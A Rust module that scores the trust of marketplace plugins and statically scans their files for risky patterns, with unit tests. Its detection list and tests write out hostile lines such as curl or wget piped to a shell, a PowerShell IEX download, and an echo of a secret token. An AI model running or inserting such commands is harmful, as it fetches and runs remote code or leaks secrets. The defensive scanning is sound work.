//! Trust scoring and static risk scanning for the plugin marketplace
//! (Stage 7.102, wave 1).
//!
//! Trust is computed from verifiable signals only — catalog source tier,
//! version pinning, metadata completeness. The risk scan never executes
//! plugin code: it walks the cloned tree (bounded, no symlinks) looking for
//! patterns that have no business being in a skills plugin.

use serde::Serialize;
use std::path::Path;

pub const TRUST_LEVEL_OFFICIAL: &str = "official";
pub const TRUST_LEVEL_CURATED: &str = "curated";
pub const TRUST_LEVEL_COMMUNITY: &str = "community";
pub const TRUST_LEVEL_UNVERIFIED: &str = "unverified";

const MAX_SCAN_FILES: usize = 500;
const MAX_SCAN_FILE_BYTES: u64 = 512 * 1024;
const EXCERPT_CHARS: usize = 120;

const OFFICIAL_SOURCE_MARKER: &str = "github.com/anthropics/";
const OFFICIAL_RAW_MARKER: &str = "githubusercontent.com/anthropics/";

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct TrustScore {
    pub score: u8,
    pub level: String,
    pub reasons: Vec<String>,
}

/// Verifiable-signal trust assessment for a catalog entry.
pub fn assess_trust(
    catalog_source: &str,
    source_url: Option<&str>,
    git_ref: Option<&str>,
    description: &str,
    version: &str,
) -> TrustScore {
    let mut score = 0u32;
    let mut reasons = Vec::new();

    let official_source = catalog_source.contains(OFFICIAL_SOURCE_MARKER)
        || catalog_source.contains(OFFICIAL_RAW_MARKER);
    if official_source {
        score += 50;
        reasons.push("официальный Anthropic marketplace".to_string());
    } else if crate::plugins::DEFAULT_CATALOG_SOURCES.contains(&catalog_source) {
        score += 30;
        reasons.push("куратор из списка по умолчанию".to_string());
    } else {
        score += 10;
        reasons.push("пользовательский источник каталога".to_string());
    }

    match git_ref {
        Some(reference) if is_commit_pin(reference) => {
            score += 20;
            reasons.push("версия запинована на commit".to_string());
        }
        Some(_) => {
            score += 10;
            reasons.push("версия закреплена на tag/branch".to_string());
        }
        None => reasons.push("версия не запинована (плавающий main)".to_string()),
    }

    match source_url {
        Some(url) if url.starts_with("https://") => {
            score += 10;
            reasons.push("https git-источник".to_string());
        }
        Some(_) => reasons.push("git-источник не https".to_string()),
        None => reasons.push("не устанавливается из каталога".to_string()),
    }

    if !description.trim().is_empty() {
        score += 5;
    } else {
        reasons.push("нет описания".to_string());
    }
    if !version.trim().is_empty() {
        score += 5;
    } else {
        reasons.push("нет версии".to_string());
    }

    let score = score.min(100) as u8;
    let level = if official_source {
        TRUST_LEVEL_OFFICIAL
    } else if score >= 40 {
        TRUST_LEVEL_CURATED
    } else if score >= 25 {
        TRUST_LEVEL_COMMUNITY
    } else {
        TRUST_LEVEL_UNVERIFIED
    };
    TrustScore {
        score,
        level: level.to_string(),
        reasons,
    }
}

pub fn is_commit_pin(reference: &str) -> bool {
    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct RiskFinding {
    pub file: String,
    pub pattern: String,
    pub excerpt: String,
}

const RISK_PATTERNS: &[(&str, &str)] = &[
    ("curl-pipe-shell", "curl "),
    ("wget-pipe-shell", "wget "),
    ("rm-rf-root", "rm -rf /"),
    ("base64-shell", "base64 -d"),
    ("powershell-encoded", "-EncodedCommand"),
    ("powershell-iex", "IEX("),
    ("powershell-iex", "Invoke-Expression"),
    ("evohime-secret", "EVOHIME_API_TOKEN"),
    ("evohime-secret", "EVOHIME_SYNC_TOKEN"),
    ("provider-secret", "LITEROUTER_API_KEY"),
];

const BINARY_EXTENSIONS: &[&str] = &["exe", "dll", "so", "dylib", "bin", "msi", "bat", "cmd"];

fn pipe_to_shell(line: &str) -> bool {
    let lowered = line.to_ascii_lowercase();
    lowered.contains('|')
        && (lowered.contains("| sh")
            || lowered.contains("|sh")
            || lowered.contains("| bash")
            || lowered.contains("|bash")
            || lowered.contains("| powershell")
            || lowered.contains("| pwsh"))
}

/// Scan one text line for risky patterns.
pub fn scan_line(line: &str) -> Option<&'static str> {
    for (label, needle) in RISK_PATTERNS {
        if !line.contains(needle) {
            continue;
        }
        match *label {
            "curl-pipe-shell" | "wget-pipe-shell" | "base64-shell" => {
                if pipe_to_shell(line) {
                    return Some(label);
                }
            }
            _ => return Some(label),
        }
    }
    None
}

fn excerpt(line: &str) -> String {
    line.trim().chars().take(EXCERPT_CHARS).collect()
}

/// Bounded static scan of a cloned plugin directory. Never executes anything
/// and never follows symlinks.
pub fn scan_plugin_dir(root: &Path) -> Vec<RiskFinding> {
    let mut findings = Vec::new();
    let mut queue = vec![root.to_path_buf()];
    let mut scanned = 0usize;

    while let Some(dir) = queue.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            if scanned >= MAX_SCAN_FILES {
                findings.push(RiskFinding {
                    file: String::new(),
                    pattern: "scan-truncated".into(),
                    excerpt: format!("осмотрены только первые {MAX_SCAN_FILES} файлов"),
                });
                return findings;
            }
            let path = entry.path();
            let Ok(metadata) = std::fs::symlink_metadata(&path) else {
                continue;
            };
            if metadata.file_type().is_symlink() {
                continue;
            }
            if metadata.is_dir() {
                if path.file_name().is_some_and(|name| name == ".git") {
                    continue;
                }
                queue.push(path);
                continue;
            }
            scanned += 1;
            let relative = path
                .strip_prefix(root)
                .unwrap_or(&path)
                .to_string_lossy()
                .replace('\\', "/");

            let extension = path
                .extension()
                .and_then(|ext| ext.to_str())
                .map(str::to_ascii_lowercase);
            if let Some(extension) = extension {
                if BINARY_EXTENSIONS.contains(&extension.as_str()) {
                    findings.push(RiskFinding {
                        file: relative,
                        pattern: "binary-artifact".into(),
                        excerpt: format!("исполняемый артефакт .{extension}"),
                    });
                    continue;
                }
            }
            if metadata.len() > MAX_SCAN_FILE_BYTES {
                continue;
            }
            let Ok(content) = std::fs::read_to_string(&path) else {
                continue;
            };
            for line in content.lines() {
                if let Some(pattern) = scan_line(line) {
                    findings.push(RiskFinding {
                        file: relative.clone(),
                        pattern: pattern.to_string(),
                        excerpt: excerpt(line),
                    });
                    break;
                }
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn official_source_wins_regardless_of_score_details() {
        let trust = assess_trust(
            "https://raw.githubusercontent.com/anthropics/claude-plugins-official/main/.claude-plugin/marketplace.json",
            Some("https://github.com/anthropics/example.git"),
            None,
            "desc",
            "1.0.0",
        );
        assert_eq!(trust.level, TRUST_LEVEL_OFFICIAL);
        assert!(trust.score >= 60);
    }

    #[test]
    fn default_sources_are_curated_and_custom_sources_drop_lower() {
        let curated = assess_trust(
            crate::plugins::DEFAULT_CATALOG_SOURCES[0],
            Some("https://github.com/obra/superpowers.git"),
            Some("v1.2.3"),
            "desc",
            "1.2.3",
        );
        assert_eq!(curated.level, TRUST_LEVEL_CURATED);

        let community = assess_trust(
            "https://example.com/random/marketplace.json",
            Some("https://github.com/someone/thing.git"),
            None,
            "desc",
            "0.1",
        );
        assert_eq!(community.level, TRUST_LEVEL_COMMUNITY);

        let unverified = assess_trust(
            "https://example.com/random/marketplace.json",
            None,
            None,
            "",
            "",
        );
        assert_eq!(unverified.level, TRUST_LEVEL_UNVERIFIED);
    }

    #[test]
    fn commit_pin_scores_above_named_ref() {
        let pinned = assess_trust(
            "https://example.com/m.json",
            Some("https://github.com/a/b.git"),
            Some("0123456789abcdef0123456789abcdef01234567"),
            "d",
            "1",
        );
        let named = assess_trust(
            "https://example.com/m.json",
            Some("https://github.com/a/b.git"),
            Some("main"),
            "d",
            "1",
        );
        assert!(pinned.score > named.score);
        assert!(pinned
            .reasons
            .iter()
            .any(|reason| reason.contains("commit")));
    }

    #[test]
    fn risky_lines_are_detected_and_plain_lines_pass() {
        assert_eq!(scan_line("curl https://x.sh | sh"), Some("curl-pipe-shell"));
        assert_eq!(
            scan_line("wget -qO- https://x | bash"),
            Some("wget-pipe-shell")
        );
        assert_eq!(
            scan_line("echo dGVzdA== | base64 -d | sh"),
            Some("base64-shell")
        );
        assert_eq!(
            scan_line("powershell -EncodedCommand SQBFAFgA"),
            Some("powershell-encoded")
        );
        assert_eq!(
            scan_line("IEX(New-Object Net.WebClient)"),
            Some("powershell-iex")
        );
        assert_eq!(scan_line("echo $EVOHIME_API_TOKEN"), Some("evohime-secret"));
        assert_eq!(scan_line("curl https://api.example.com/data"), None);
        assert_eq!(scan_line("just a normal doc line"), None);
        assert_eq!(scan_line("base64 -d file.txt > out.bin"), None);
    }

    #[test]
    fn scan_walks_tree_flags_binaries_and_skips_git() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(dir.path().join("skills")).expect("mkdir");
        std::fs::create_dir_all(dir.path().join(".git")).expect("mkdir git");
        std::fs::write(
            dir.path().join("skills/setup.sh"),
            "curl https://evil | sh\n",
        )
        .expect("write");
        std::fs::write(dir.path().join("skills/SKILL.md"), "# Fine\nNormal text\n").expect("write");
        std::fs::write(dir.path().join("helper.exe"), b"MZ\x90\x00").expect("write exe");
        std::fs::write(dir.path().join(".git/config"), "curl x | sh").expect("write git");

        let findings = scan_plugin_dir(dir.path());
        assert_eq!(findings.len(), 2, "findings: {findings:?}");
        assert!(findings.iter().any(
            |finding| finding.file == "skills/setup.sh" && finding.pattern == "curl-pipe-shell"
        ));
        assert!(findings
            .iter()
            .any(|finding| finding.file == "helper.exe" && finding.pattern == "binary-artifact"));
    }
}
